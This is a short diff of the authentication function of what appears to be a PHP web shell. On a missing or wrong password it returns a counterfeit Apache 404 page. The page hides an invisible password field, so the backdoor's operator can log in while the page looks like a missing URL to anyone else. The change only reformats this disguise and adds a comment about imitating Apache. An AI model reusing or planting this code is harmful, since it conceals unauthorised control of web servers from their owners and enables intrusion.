@@ -26,15 +26,16 @@ if(!function_exists('auth')){
 
 			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
 				header("HTTP/1.0 404 Not Found");
-				$res = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n".
-						"<html><head>\n".
-						"<title>404 Not Found</title><meta name='robots' content='noindex,nofollow,noarchive'>\n".
-						"</head><body>\n".
-						"<h1>Not Found</h1>\n".
-						"<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>\n".
-						"<hr>\n".
-						"<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."<script type='text/javascript'>document.write(\"<form method='post'><center><input type='password' id='pass' name='pass' style='border:0px;cursor:default;'></center></form>\");</script></address>\n".
-						"</body></html>\n";
+				//similar to apache2 404 error page
+				$res = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">".PHP_EOL.
+						"<html><head>".PHP_EOL.
+						"<title>404 Not Found</title><meta name='robots' content='noindex,nofollow,noarchive'>".PHP_EOL.
+						"</head><body>".PHP_EOL.
+						"<h1>Not Found</h1>".PHP_EOL.
+						"<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>".PHP_EOL.
+						"<hr>".PHP_EOL.
+						"<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."<script type='text/javascript'>document.write(\"<form method='post'><center><input type='password' name='pass' style='border:0px;cursor:default;'></center></form>\");</script></address>".PHP_EOL.
+						"</body></html>".PHP_EOL;
 				echo $res;
 				die();
 			}
